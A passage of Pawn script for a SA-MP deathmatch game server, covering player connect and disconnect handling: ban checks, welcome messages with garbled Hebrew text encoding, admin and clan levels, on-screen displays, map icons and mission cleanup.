	"Satchel Charge",
	"Detonator",
	"Spraycan",
	"Fire Extinguisher",
	"Camera",
	"Nightvision Goggles",
	"Thermal Goggles",
	"Parachute",
	"Fake Pistol"
};

//------------------------------------------------------------------------------

public UpdateScore() for(new i=0; i<MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetPlayerScore(i, AntiCheat_GetPlayerMoney(i));

//------------------------------------------------------------------------------

public OnPlayerConnect(playerid)
{
	new string[256];
	if(GetBan(playerid) == 1)
	{
		/*format(string, sizeof(string), "BanInfo: (By Admin: \"%s\") (Player into the ban: \"%s\") (Ip been banned: \"%s\")", DOF2_GetString(File(playerid), "AdminBan"), GetName(playerid), GetIP(playerid));
		SendClientMessage(playerid, Orange, string);
		format(string, sizeof(string), "BanInfo: (Time & Date: %d.%d.%d | %d:%d:%d) (Reason: %s)", DOF2_GetInt(File(playerid), "DayBan"), DOF2_GetInt(File(playerid), "MonthBan"), DOF2_GetInt(File(playerid), "YearBan"),  DOF2_GetInt(File(playerid), "HourBan"), DOF2_GetInt(File(playerid), "MinuteBan"),  DOF2_GetInt(File(playerid), "SecondBan"), DOF2_GetString(File(playerid), "ReasonBan"));
		SendClientMessage(playerid, Orange, string);*/
		if(strcmp(DOF2_GetString(File(playerid), "SupporterBan"), "None", true) == 0)
		{
			format(string, sizeof(string), "[BanInfo] {FF0000}Reason: {FFFFFF}%s", DOF2_GetString(File(playerid), "ReasonBan"));
			SendClientMessage(playerid, Orange, string);
			format(string, sizeof(string), "[BanInfo] {FF0000}Ip been banned: {FFFFFF}%s", GetIP(playerid));
			SendClientMessage(playerid, Orange, string);
			format(string, sizeof(string), "[BanInfo] {FF0000}By admin: {FFFFFF}%s", DOF2_GetString(File(playerid), "AdminBan"));
			SendClientMessage(playerid, Orange, string);
			format(string, sizeof(string), "[BanInfo] {FF0000}Time & Date: {FFFFFF}%d:{FFFFFF}%d:{FFFFFF}%d - {FFFFFF}%d/{FFFFFF}%d/{FFFFFF}%d", DOF2_GetInt(File(playerid), "HourBan"), DOF2_GetInt(File(playerid), "MinuteBan"), DOF2_GetInt(File(playerid), "SecondBan"), DOF2_GetInt(File(playerid), "DayBan"), DOF2_GetInt(File(playerid), "MonthBan"), DOF2_GetInt(File(playerid), "YearBan"));
			SendClientMessage(playerid, Orange, string);
			disreason[playerid] = 4;
			kixkx[playerid] = SetTimerEx("kickx", 1000, 1, "d", playerid);
			return 1;
		}
		else if(strcmp(DOF2_GetString(File(playerid), "AdminBan"), "None", true) == 0)
		{
			format(string, sizeof(string), "[BanInfo] {FF0000}Reason: {FFFFFF}%s", DOF2_GetString(File(playerid), "ReasonBan"));
			SendClientMessage(playerid, Orange, string);
			format(string, sizeof(string), "[BanInfo] {FF0000}Ip been banned: {FFFFFF}%s", GetIP(playerid));
			SendClientMessage(playerid, Orange, string);
			format(string, sizeof(string), "[BanInfo] {FF0000}By supporter: {FFFFFF}%s", DOF2_GetString(File(playerid), "SupporterBan"));
			SendClientMessage(playerid, Orange, string);
			format(string, sizeof(string), "[BanInfo] {FF0000}Time & Date: {FFFFFF}%d:{FFFFFF}%d:{FFFFFF}%d - {FFFFFF}%d/{FFFFFF}%d/{FFFFFF}%d", DOF2_GetInt(File(playerid), "HourBan"), DOF2_GetInt(File(playerid), "MinuteBan"), DOF2_GetInt(File(playerid), "SecondBan"), DOF2_GetInt(File(playerid), "DayBan"), DOF2_GetInt(File(playerid), "MonthBan"), DOF2_GetInt(File(playerid), "YearBan"));
			SendClientMessage(playerid, Orange, string);
			disreason[playerid] = 4;
			kixkx[playerid] = SetTimerEx("kickx", 1000, 1, "d", playerid);
			return 1;
		}
	}

	if(DOF2_GetInt("/BansIP.ini", GetIP(playerid)) == 1)
	{
		format(string, sizeof(string), "[BanInfo] {FF0000}This ip {FFFFFF}%s {FF0000}had been banned", GetIP(playerid));
		SendClientMessage(playerid, Orange, string);
		disreason[playerid] = 4;
		kixkx[playerid] = SetTimerEx("kickx", 1000, 1, "d", playerid);
		return 1;
	}
	
	OnPlayerCommandText(playerid, "/AudioMsg");
	//PlayAudioStreamForPlayer(playerid, "http://k003.kiwi6.com/hotlink/14fb42og3v/Mohombi_Maraca_Promo_Video.mp3"); // Maracana
	PlayAudioStreamForPlayer(playerid, "http://k003.kiwi6.com/hotlink/1oz86m81vw/Danza_Kuduro_Don_Omar_Lyrics_on_Screen.mp3"); // Danza Kuduro

	format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {FFFFFF}äúçáø ìùøú {FF0000}%s {FFFFFF}äîùúîù [#%d]", GetName(playerid),playerid);
	OL_SendClientMessageToAllEx(playerid, Grey, string);
	for(new i=0; i<100; i++) SendClientMessage(playerid, White, "");
	SendClientMessage(playerid, Azure, "=========================[ {FFFFFF}áøåëéí äáàéí ìùøú{0087FF} ]=========================");
	SendClientMessage(playerid, Gold, "{FFD720}! î÷ååéí ùúäðä ,{FFFFFF}Fxp DeathMatch{FFD720} àðå ùîçéí ùáçøú ìùç÷ áùøú");
	SendClientMessage(playerid, Aqua, "äùøú ùìðå îðåäì áöåøä ùåèôú ùì äöååú àí äéðëí îåöàéí áàâ úãååçå ìðå");
	SendClientMessage(playerid, Brightred, "{FFFFFF}/Help {FF0000}:ìòæøä äùúîùå áô÷åãä");
	format(string, sizeof(string), "äåãòú ëðéñä àåèåîèéú: {CED1D7}%s", DOF2_GetString("/AutomaticMessage.ini", "ConnectMessage"));
	SendClientMessage(playerid, Grey, string);
	
	if(GetLogIn(playerid) == 1 && !strcmp(GetIP(playerid), DOF2_GetString(File(playerid), "IP"), true))
	{
		if(DOF2_GetInt(File(playerid), "ReadRules") != -1) RulesTimer[playerid] = SetTimerEx("ReadRules", 1000*1*1, 0, "d", playerid);
		else
		{
			//format(string, sizeof(string), "{33CCFF}äúçáøú àåèåîèéú ìôé äàééôé {FFFFFF}%s {33CCFF}áøåê äùá äîùúîù", GetName(playerid));
			//SendClientMessage(playerid, Pilot, string);

			AccountLog[playerid] = true;
			/*format(string, sizeof(string), "{FFA500}[ExclusiveDeathMatch] {FFFFFF}äúçáø ìùç÷ï àåèåîèé ìôé àééôé {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
			OL_SendClientMessageToAllEx(playerid, Grey, string);*/

			if(GetAdminLevel(playerid) == 1) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú ðéäåì:{33AA33} àçøàé ôòéìåéåú");
	 		if(GetAdminLevel(playerid) == 2) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú ðéäåì:{33AA33} îðäì áðéñéåï");
			if(GetAdminLevel(playerid) == 3) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú ðéäåì:{33AA33} îðäì");
			if(GetAdminLevel(playerid) == 4) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú ðéäåì:{33AA33} îðäì áëéø");
			if(GetAdminLevel(playerid) == 5) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú ðéäåì:{33AA33} àçøàé ÷äéìä");

			if(GetSupportLevel(playerid) == 1) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú úåîê:{FFCC33} áðéñéåï");
			if(GetSupportLevel(playerid) == 2) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú úåîê:{FFCC33} çáø");
			if(GetSupportLevel(playerid) == 3) SendClientMessage(playerid, Whiteorange, "{FFFFFF}øîú úåîê:{FFCC33} àçøàé");

			if(GetVipLevel(playerid) == 1) SendClientMessage(playerid, Pink, "{FFFFFF}øîú åéàééôé:{FF66FF} çáø");
		 	if(GetVipLevel(playerid) == 2) SendClientMessage(playerid, Pink, "{FFFFFF}øîú åéàééôé:{FF66FF} àçøàé");

			DOF2_SetString(File(playerid), "IP", GetIP(playerid));

			if(DOF2_GetInt(File(playerid), "inMute") == 1)
			{
				inMute[playerid] = 1;
				MuteTimer[playerid] = SetTimerEx("AutomaticUnmute", 60*1000*DOF2_GetInt(File(playerid), "MuteTime"), 0, "d", playerid);
				MuteTimer1[playerid] = SetTimerEx("AutomaticMainusMuteTime", 60*1000, 0, "d", playerid);
			}
					
			if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel10")) DOF2_SetInt(File(playerid), "Level", 10);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel9")) DOF2_SetInt(File(playerid), "Level", 9);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel8")) DOF2_SetInt(File(playerid), "Level", 8);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel7")) DOF2_SetInt(File(playerid), "Level", 7);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel6")) DOF2_SetInt(File(playerid), "Level", 6);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel5")) DOF2_SetInt(File(playerid), "Level", 5);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel4")) DOF2_SetInt(File(playerid), "Level", 4);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel3")) DOF2_SetInt(File(playerid), "Level", 3);
			else if(DOF2_GetInt(File(playerid), "Kills") >= DOF2_GetInt("/Setting.ini", "KillsLevel2")) DOF2_SetInt(File(playerid), "Level", 2);
			else if(DOF2_GetInt(File(playerid), "Kills") < DOF2_GetInt("/Setting.ini", "KillsLevel1")) DOF2_SetInt(File(playerid), "Level", 1);

			format(ClanFile, sizeof(ClanFile), "Clans/%s.ini", DOF2_GetString(File(playerid), "Clan"));
			if(!DOF2_FileExists(ClanFile)) DOF2_Unset(File(playerid), "ClanLevel"), DOF2_Unset(File(playerid), "Clan"), DOF2_SetInt(File(playerid), "InClan", 0);

			if(DOF2_GetInt(File(playerid), "InClan") == 1)
			{
			    format(string, sizeof(string), "{FFFFFF}%s{008080} àúä ùç÷ï ÷ìàï", DOF2_GetString(File(playerid), "Clan"));
				if(DOF2_GetInt(File(playerid), "ClanLevel") == 1) SendClientMessage(playerid, Bluesea, string);
				format(string, sizeof(string), "{FFFFFF}%s{008080} àúä áåçï ÷ìàï", DOF2_GetString(File(playerid), "Clan"));
				if(DOF2_GetInt(File(playerid), "ClanLevel") == 2) SendClientMessage(playerid, Bluesea, string);
				format(string, sizeof(string), "{FFFFFF}%s{008080} àúä ñâï îðäì ÷ìàï", DOF2_GetString(File(playerid), "Clan"));
				if(DOF2_GetInt(File(playerid), "ClanLevel") == 3) SendClientMessage(playerid, Bluesea, string);
				format(string, sizeof(string), "{FFFFFF}%s{008080} àúä îðäì ÷ìàï", DOF2_GetString(File(playerid), "Clan"));
				if(DOF2_GetInt(File(playerid), "ClanLevel") == 4) SendClientMessage(playerid, Bluesea, string);
			}

			format(string, sizeof(string), "{008080}äåãòú ÷ìàï: {FFFFFF}%s", DOF2_GetString(ClanFile, "ClanMsg"));
			if(DOF2_GetInt(ClanFile, "HaveMsg") == 1) SendClientMessage(playerid, Bluesea, string);
		}
	}
	
	BattleOption[playerid] = 1;
	animswitchid[playerid] = 1;
	
	WebSiteLogo[playerid] = TextDrawCreate(250, 435, "www.Fxp.Co.il");
	TextDrawFont(WebSiteLogo[playerid], 3);
	TextDrawSetShadow(WebSiteLogo[playerid], 0);
 	TextDrawSetOutline(WebSiteLogo[playerid], 1);
 	TextDrawBackgroundColor(WebSiteLogo[playerid], 0x000000FF);
 	TextDrawColor(WebSiteLogo[playerid], 0xFFFFFFFF);
 	
 	PlayeridName[playerid] = TextDrawCreate(3, 435, "None");
	TextDrawFont(PlayeridName[playerid], 3);
	TextDrawSetShadow(PlayeridName[playerid], 0);
 	TextDrawSetOutline(PlayeridName[playerid], 1);
 	TextDrawBackgroundColor(PlayeridName[playerid], 0x000000FF);
 	TextDrawColor(PlayeridName[playerid], 0xFFFFFFFF);
 	format(string, sizeof(string), "%s", GetName(playerid));
 	TextDrawSetString(PlayeridName[playerid], string);

	Bar_Health[playerid] = TextDrawCreate(569.5, 68.5, "100%");
	TextDrawFont(Bar_Health[playerid], 3);
	TextDrawSetOutline(Bar_Health[playerid], 1);
	TextDrawLetterSize(Bar_Health[playerid], 0.199999, 0.555555);
	TextDrawColor(Bar_Health[playerid], 0xffffffff);

	Bar_Armour[playerid] = TextDrawCreate(569.5, 46.5, "100%");
	TextDrawFont(Bar_Armour[playerid], 3);
	TextDrawSetOutline(Bar_Armour[playerid], 1);
	TextDrawLetterSize(Bar_Armour[playerid],0.199999, 0.555555);
	TextDrawColor(Bar_Armour[playerid], 0xffffffff);
	/*
	Bar_Money[playerid] = TextDrawCreate(600.5, 30.5, "00000000");
	TextDrawFont(Bar_Money[playerid], 3);
//	TextDrawSetOutline(Bar_Money[playerid], 3);
	TextDrawLetterSize(Bar_Money[playerid],0.699999, 1.555555);
	TextDrawColor(Bar_Money[playerid], 0xffffffff);
*/
	Bar_Money[playerid] = TextDrawCreate(497.000000,96.000000,"$00000000");
	TextDrawAlignment(Bar_Money[playerid],0);
	TextDrawBackgroundColor(Bar_Money[playerid],0x000000ff);
	TextDrawFont(Bar_Money[playerid],3);
	TextDrawLetterSize(Bar_Money[playerid],0.599999,2.200000);
	TextDrawColor(Bar_Money[playerid],White);
	TextDrawSetOutline(Bar_Money[playerid],1);
	TextDrawSetProportional(Bar_Money[playerid],1);
/*
    VehID[playerid] = TextDrawCreate(215, 415, "] ~y~V~w~ehicle ~y~S~w~tatus ]");
 	TextDrawFont(VehID[playerid], 2);
 	TextDrawSetOutline(VehID[playerid], 1);
 	TextDrawColor(VehID[playerid], 0xffffffff);
*/
	SetPlayerMapIcon(playerid, 0, 1402.1061 ,-2286.9353, 13.3828, 53, 0, MAPICON_LOCAL); // Race
	SetPlayerMapIcon(playerid, 1, 834.8967, -2117.5947, 6.1109, 9, 0, MAPICON_LOCAL); // MoneyShip
	SetPlayerMapIcon(playerid, 2, 1368.2871, -1279.7972, 13.5469, 6, 0, MAPICON_LOCAL); // Ammu
	SetPlayerMapIcon(playerid, 3, 1177.2866, -1323.4557, 14.0632, 22, 0, MAPICON_LOCAL); // Hospital
	SetPlayerMapIcon(playerid, 4, 1839.3334, -2542.8525, 13.5469, 5, 0, MAPICON_LOCAL); // Airport
	SetPlayerMapIcon(playerid, 5, 1558.2148, 22.7656, 24.1593, 51, 0, MAPICON_LOCAL); // Jeeps
	SetPlayerMapIcon(playerid, 6, 1260.8658, -2026.6477, 59.3952, 24, 0, MAPICON_LOCAL); // Drift
	SetPlayerMapIcon(playerid, 7, 1228.6213, -1652.8035, 11.7969, 52, 0, MAPICON_LOCAL); // Bank
	SetPlayerMapIcon(playerid, 8, 1790.9423, -1901.7134, 13.3973, 57, 0, MAPICON_LOCAL); // Station
	SetPlayerMapIcon(playerid, 9, 1544.2573, -1353.2303, 329.5652, 42, 0, MAPICON_LOCAL); // Tower
	SetPlayerMapIcon(playerid, 10, 1905.5831, -1414.8954, 13.5703, 23, 0, MAPICON_LOCAL); // Ramp
	SetPlayerMapIcon(playerid, 11, 1556.0050, -1664.9197, 5.7805, 30, 0, MAPICON_LOCAL); // Police
	SetPlayerMapIcon(playerid, 12, 1651.0093, -1049.9625, 23.8984, 55, 0, MAPICON_LOCAL); // Carpark
	SetPlayerMapIcon(playerid, 13, 2565.4160, -2451.3540, 13.6257, 18, 0, MAPICON_LOCAL); // Military
	SetPlayerMapIcon(playerid, 14, -2401.8035, 331.1254, 35.1719, 61, 0, MAPICON_LOCAL); // SF
	SetPlayerMapIcon(playerid, 15, 2485.9258, -1672.6036, 13.3359, 62, 0, MAPICON_LOCAL); // LS
	SetPlayerMapIcon(playerid, 16, 2048.8237, 1343.5442, 10.7642, 60, 0, MAPICON_LOCAL); // LV

	SetPlayerMapIcon(playerid, 30, 830.0182, -1361.8060, -0.5015, 56, 0, MAPICON_LOCAL); // Money Mission
	SetPlayerMapIcon(playerid, 31, 1339.4198, -2322.0276, 13.6703, 56, 0, MAPICON_LOCAL); // Race Mission
	SetPlayerMapIcon(playerid, 32, 1972.2798, -1446.1188, 13.5163, 56, 0, MAPICON_LOCAL); // Stunts Mission
	SetPlayerMapIcon(playerid, 33, 1271.6698, -2048.0618, 59.3168, 56, 0, MAPICON_LOCAL); // Drift Mission
	SetPlayerMapIcon(playerid, 34, 1544.5236, -1374.6577, 330.0591, 56, 0, MAPICON_LOCAL); // Parachuting Mission
	
	PropTimer = SetTimer("UpdateProperties", 1000*1*1, 1);
	
	DOO_OnPlayerConnect(playerid);
	
	ResetPlayerMoney(playerid);
	AntiCheat_Money[playerid] = 0;
	return 1;
}

//------------------------------------------------------------------------------

public OnPlayerDisconnect(playerid, reason)
{
	new string[256];
    Delete3DTextLabel(ActLevel[playerid]);
    if(playerid==starterid)
    {
		new string1[sizeof(Act_Name)+50];
		format(string1, sizeof(string1),"òæá àú äùøú {FFFFFF}%s{8F6F6F} äôòéìåú äéãðéú áåèìä îëéååï ùäîðäì",GetName(playerid));
		SendClientMessageToAll(ActiColor,string1);
		ActOn=false;
  		for(new i;i<GetMaxPlayers();i++)if(IsPlayerConnected(i) && ActivityStatus[i]==1)ExitAct(i);
    }
	if(disreason[playerid] == 0)
	{
		switch(reason)
		{
			case 0:
			{
				format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(úåí æîï îå÷öä {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
				DOF2_SetInt(File(playerid), "HaveCrash", 1);
				if(AntiCheat_GetPlayerMoney(playerid) > 0) DOF2_SetInt(File(playerid), "CrashMoney", AntiCheat_GetPlayerMoney(playerid));
				if(DOF2_GetInt(File(playerid), "TempAdminLevel") >= 1) DOF2_SetInt(File(playerid), "CrashAdmin", DOF2_GetInt(File(playerid), "TempAdminLevel"));
			}
			case 1: format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(òæá {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
			case 2: format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(ðáòè {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
		}
		OL_SendClientMessageToAllEx(playerid, Grey, string);
	}
	
	
	format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(ðçñí {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
	if(disreason[playerid] == 1) OL_SendClientMessageToAllEx(playerid, Grey, string);
	format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(ñéñîà ùâåééä 3 ôòîéí {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
	if(disreason[playerid] == 2) OL_SendClientMessageToAllEx(playerid, Grey, string);
	format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(òéãëåï äùí áîùç÷ ìàçø ùéðåé {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
	if(disreason[playerid] == 3) OL_SendClientMessageToAllEx(playerid, Grey, string);
	format(string, sizeof(string), "{FFA500}[FxpDeathMatch] {AFAFAF}({FFFFFF}éöà îäùøú {AFAFAF}(äîùúîù/äàééôé çñåîéí îäùøú {FF0000}%s {FFFFFF}äîùúîù", GetName(playerid));
	if(disreason[playerid] == 4) OL_SendClientMessageToAllEx(playerid, Grey, string);


   	if(GetSpyAdminLevel(playerid) == 2 && inAdminSpy[playerid] == 1) DOF2_SetInt(File(playerid), "AdminLevel", 2), DOF2_SetInt(File(playerid), "AdminSpy", 0), inAdminSpy[playerid] = 0;
	else if(GetSpyAdminLevel(playerid) == 3 && inAdminSpy[playerid] == 1) DOF2_SetInt(File(playerid), "AdminLevel", 3), DOF2_SetInt(File(playerid), "AdminSpy", 0), inAdminSpy[playerid] = 0;
	else if(GetSpyAdminLevel(playerid) == 4 && inAdminSpy[playerid] == 1) DOF2_SetInt(File(playerid), "AdminLevel", 4), DOF2_SetInt(File(playerid), "AdminSpy", 0), inAdminSpy[playerid] = 0;
	else if(GetSpyAdminLevel(playerid) == 5 && inAdminSpy[playerid] == 1) DOF2_SetInt(File(playerid), "AdminLevel", 5), DOF2_SetInt(File(playerid), "AdminSpy", 0), inAdminSpy[playerid] = 0;
	
	if(DOF2_GetInt(File(playerid), "TempAdminLevel") >= 1) DOF2_SetInt(File(playerid), "TempAdminLevel", 0);
	
	if(DOF2_GetInt(File(playerid), "GangLevel") == 2)
	{
		format(string, sizeof(string), "! ðîç÷ä àåèåîèéú ò÷á òæéáú îðäì äëðåôééä îäùøú \"{FFFFFF}%s{8B5A2B}\" äëðåôééä", DOF2_GetString(File(playerid), "Gang"));
		for(new i=0; i<MAX_PLAYERS; i++) if(i != playerid && DOF2_GetInt(File(i), "InGang") == 1 && strcmp(DOF2_GetString(File(playerid), "Gang"), DOF2_GetString(File(i), "Gang"), true) == 0)
		{
			SendClientMessage(i, Whitebrown, string);
			DOF2_Unset(File(i), "GangLevel");
			DOF2_Unset(File(i), "Gang");
			DOF2_SetInt(File(i), "InGang", 0);
		}
		format(GangFile, sizeof(GangFile), "Gangs/%s.ini", DOF2_GetString(File(playerid), "Gang"));
		DOF2_Unset(File(playerid), "GangLevel");
		DOF2_Unset(File(playerid), "Gang");
		DOF2_SetInt(File(playerid), "InGang", 0);
		DOF2_RemoveFile(GangFile);
	}
	else if(DOF2_GetInt(File(playerid), "GangLevel") == 1)
	{
		format(string, sizeof(string), "! òæá àú äëðåôééä ò÷á òæéáúå îäùøú {FFFFFF}%s{8B5A2B} äùç÷ï", GetName(playerid));
		for(new i=0; i<MAX_PLAYERS; i++) if(IsPlayerConnected(i) && Logged[i] == true && i != playerid && DOF2_GetInt(File(i), "InGang") == 1 && strcmp(DOF2_GetString(File(playerid), "Gang"), DOF2_GetString(File(i), "Gang"), true) == 0) SendClientMessage(i, Whitebrown, string);
		DOF2_Unset(File(playerid), "GangLevel");
		DOF2_Unset(File(playerid), "Gang");
		DOF2_SetInt(File(playerid), "InGang", 0);
	}

	if(Minigun_ACT_In[playerid] == 1)
	{
		Minigun_ACT_In[playerid] = 0;
		AutomaticACT_In[playerid] = 0;
		Minigun_ACT_AllPlayers -=1;
	}

	if(RandomWeapon_ACT_In[playerid] == 1)
	{
		RandomWeapon_ACT_In[playerid] = 0;
		AutomaticACT_In[playerid] = 0;
		RandomWeapon_ACT_AllPlayers -=1;
	}

	if(Monster_ACT_In[playerid] == 1)
	{
		Monster_ACT_In[playerid] = 0;
		AutomaticACT_In[playerid] = 0;
		Monster_ACT_AllPlayers -=1;
	}

	if(Karting_ACT_In[playerid] == 1)
	{
		Karting_ACT_In[playerid] = 0;
		AutomaticACT_In[playerid] = 0;
		Karting_ACT_AllPlayers -=1;
    	DisablePlayerRaceCheckpoint(playerid);
      	CP_KartingActivity[playerid] = 0;
	}
	
	if(Drift_ACT_In[playerid] == 1)
	{
		Drift_ACT_In[playerid] = 0;
		AutomaticACT_In[playerid] = 0;
		Drift_ACT_AllPlayers -=1;
    	DisablePlayerRaceCheckpoint(playerid);
      	CP_DriftActivity[playerid] = 0;
	}
	
	if(SawnoffKing_ACT_In[playerid] == 1)
	{
		SawnoffKing_ACT_In[playerid] = 0;
		AutomaticACT_In[playerid] = 0;
		SawnoffKing_ACT_AllPlayers -=1;
	}

	if(InBattle[playerid] == 1)
	{
	    InBattle[playerid] = 0;
		BattlePlayers -=1;
		BattleLosser_Disconnect = GetName(playerid);
		CheckBattleWinner(1);
	}

	if(inJail[playerid] == 1)
	{
		KillTimer(JailTimer[playerid]);
		KillTimer(JailTimer1[playerid]);
  		inJail[playerid] = 0;
	}

	if(inMute[playerid] == 1)
	{
		KillTimer(MuteTimer[playerid]);
		KillTimer(MuteTimer1[playerid]);
  		inMute[playerid] = 0;
	}
	
	if(MoneyMission_In[playerid] == 1)
	{
		MoneyMission_Start = 0;
		MoneyMission_In[playerid] = 0;
		DestroyVehicle(MoneyMission_Bike);
 		KillTimer(MoneyMission_Timer_1);
 		KillTimer(MoneyMission_Timer_2);
 		format(string, sizeof(string), "{FFFFFF}[Money Mission]{AA3333} ìà äöìéç ìäâéò ìéòã ùì îùéîú äëñó {FFFFFF}%s{AA3333} äùç÷ï", GetName(MoneyMission_Player));
		OL_SendClientMessageToAllEx(playerid, Red, string);
		OL_SendClientMessageToAllEx(playerid, White, "äùç÷ï ðôñì ò÷á éöéàä îäîùç÷ -");
		RemovePlayerAttachedObject(playerid, 2); // MoneyBag
	}
	MoneyMission_WasFinish[playerid] = 0;
	
	if(RaceMission_In[playerid] == 1)
	{
    	DisablePlayerRaceCheckpoint(playerid);
      	CP_RaceMission[playerid] = 0;
		RaceMission_Start = 0;
		RaceMission_In[playerid] = 0;
 		DestroyVehicle(RaceMission_Car);
 		KillTimer(RaceMission_Timer_1);
 		KillTimer(RaceMission_Timer_2);
 		format(string, sizeof(string), "{FFFFFF}[Race Mission]{AA3333} ìà äöìéç ìäâéò ì÷å äñéåí ùì îùéîú äîéøåõ {FFFFFF}%s{AA3333} äùç÷ï", GetName(RaceMission_Player));
		OL_SendClientMessageToAllEx(playerid, Red, string);
		OL_SendClientMessageToAllEx(playerid, White, "äùç÷ï ðôñì ò÷á éöéàä îäîùç÷ -");
 	}
	RaceMission_WasFinish[playerid] = 0;

	if(RobberyMission_In[playerid] == 1)
	{
		RobberyMission_In[playerid] = 0;
 		DestroyVehicle(RobberyMission_Car);
 		KillTimer(RobberyMission_Timer_1);
 		KillTimer(RobberyMission_Timer_2);
 		format(string, sizeof(string), "{FFFFFF}[Robbery Mission]{AA3333} ìà äöìéç ìùãåã àú äáð÷ {FFFFFF}%s{AA3333} äùç÷ï", GetName(RobberyMission_Player));
		OL_SendClientMessageToAllEx(playerid, Red, string);
		OL_SendClientMessageToAllEx(playerid, White, "äùç÷ï ðôñì ò÷á éöéàä îäîùç÷ -");
 	}
 	
	if(StuntsMission_In[playerid] == 1)
	{
		StuntsMission_Start = 0;
		StuntsMission_In[playerid] = 0;
 		DestroyVehicle(StuntsMission_Car);
 		KillTimer(StuntsMission_Timer_1);
 		KillTimer(StuntsMission_Timer_2);
 		format(string, sizeof(string), "{FFFFFF}[Stunts Mission]{AA3333} ìà äöìéç ìäâéò ìéòã ùì îùéîú äñèàðèéí {FFFFFF}%s{AA3333} äùç÷ï", GetName(StuntsMission_Player));
		OL_SendClientMessageToAllEx(playerid, Red, string);
		OL_SendClientMessageToAllEx(playerid, White, "äùç÷ï ðôñì ò÷á éöéàä îäîùç÷ -");
	}
	StuntsMission_WasFinish[playerid] = 0;
	
	if(DriftMission_In[playerid] == 1)
	{
    	DisablePlayerRaceCheckpoint(playerid);
      	CP_DriftMission[playerid] = 0;
		DriftMission_Start = 0;
		DriftMission_In[playerid] = 0;
 		DestroyVehicle(DriftMission_Car);
 		KillTimer(DriftMission_Timer_1);
 		KillTimer(DriftMission_Timer_2);
 		format(string, sizeof(string), "{FFFFFF}[Drift Mission]{AA3333} ìà äöìéç ìäâéò ì÷å äñéåí ùì îùéîú äãøéôè {FFFFFF}%s{AA3333} äùç÷ï", GetName(DriftMission_Player));
		OL_SendClientMessageToAllEx(playerid, Red, string);
		OL_SendClientMessageToAllEx(playerid, White, "äùç÷ï ðôñì ò÷á éöéàä îäîùç÷ -");
 	}
	DriftMission_WasFinish[playerid] = 0;
	
	if(ParachutingMission_In[playerid] == 1)
	{
        DisablePlayerRaceCheckpoint(playerid);
      	CP_ParachutingMission[playerid] = 0;
		ParachutingMission_Start = 0;
		ParachutingMission_In[playerid] = 0;
 		KillTimer(ParachutingMission_Timer_1);
 		KillTimer(ParachutingMission_Timer_2);
 		format(string, sizeof(string), "{FFFFFF}[Parachuting Mission]{AA3333} ìà äöìéç ìäâéò ìéòã ùì îùéîú äöðéçä {FFFFFF}%s{AA3333} äùç÷ï", GetName(ParachutingMission_Player));
		OL_SendClientMessageToAllEx(playerid, Red, string);
		OL_SendClientMessageToAllEx(playerid, White, "äùç÷ï ðôñì ò÷á éöéàä îäîùç÷ -");
	}
	ParachutingMission_WasFinish[playerid] = 0;

	RemovePlayerAttachedObject(playerid, 1); // Helmet
	RemovePlayerAttachedObject(playerid, 3); // Crash
	
	for(new i=0; i<MAX_PLAYERS; i++) /*if(playerid == Lotto_Number[i]) Lotto_Use[i] = 0;*/
	
	Logged[playerid] = false;
	AccountLog[playerid] = false;
	disreason[playerid] = 0;
	inPhantom[playerid] = 0;
	CheckPhantom[playerid] = 0;
	AntiCheat_Money[playerid] = 0;
	DestroyBarrels(playerid);
	WasBarrel[playerid] = 0;
	WasRocket[playerid] = 0;
	ActivityStatus[playerid] = 0;
	TimeBlockedWord[playerid] = 0;
	inSpec[playerid] = 0;
 	inAFK[playerid] = 0;
 	inGodmode[playerid] = 0;
	inWar[playerid] = 0;
	inFunbattle[playerid] = 0;
	inHardcore[playerid] = 0;
	inDM[playerid] = 0;
	HaveRCXD[playerid] = 0;
	inRCXD[playerid] = 0;
	BattleOption[playerid] = 0;
//	Lotto_In[playerid] = 0;
	AutomaticACT_In[playerid] = 0;
	BombSize[playerid][0] = 0;
	BombSize[playerid][1] = 0;
	BombSize[playerid][2] = 0;
	HaveBomb[playerid] = 0;
	BombVehicle[playerid] = -1;
	UseBomb[playerid] = 0;
	DestroyObject(BombObject[playerid]);
	DestroyVehicle(RCXD[playerid]);
	KillTimer(RCXDTimer[playerid]);
